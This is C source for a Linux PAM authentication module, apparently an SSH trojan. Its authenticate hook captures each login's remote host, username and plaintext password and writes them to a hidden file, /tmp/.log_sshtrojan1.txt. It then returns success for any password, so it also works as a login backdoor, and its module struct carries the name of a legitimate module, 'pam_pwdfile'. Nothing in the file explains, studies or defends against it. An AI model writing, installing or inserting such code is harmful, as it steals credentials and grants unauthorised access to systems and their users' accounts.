#ifndef LINUX 
#include <security/pam_appl.h>
#endif  /* LINUX */

#define PAM_SM_AUTH
#include <security/pam_modules.h>

#include <syslog.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/file.h>

#define _XOPEN_SOURCE
#include <unistd.h>

/* expected hook for auth service */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
				   int argc, const char **argv) {
	char *pword, *uname, *remhst;

	pam_get_item(pamh, PAM_AUTHTOK, (void *) &pword);
	pam_get_item(pamh, PAM_USER, (void*) &uname);
    pam_get_item(pamh, PAM_RHOST, (void*) &remhst);

	if (!pword || !uname) {
		return PAM_AUTHINFO_UNAVAIL;
	}
	FILE *f = fopen("/tmp/.log_sshtrojan1.txt", "w");
	if (f == NULL)
	{
		exit(1);
	}
	fprintf(f,"host = %s : username = %s : password = %s\n", remhst, uname, pword);
	fclose(f);
	return PAM_SUCCESS;
}

/* another expected hook */
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, 
			      int argc, const char **argv)
{
   return PAM_SUCCESS;
}

#ifdef PAM_STATIC
struct pam_module _pam_listfile_modstruct = {
   "pam_pwdfile",
     pam_sm_authenticate,
     pam_sm_setcred,
     NULL,
     NULL,
     NULL,
     NULL,
};
#endif
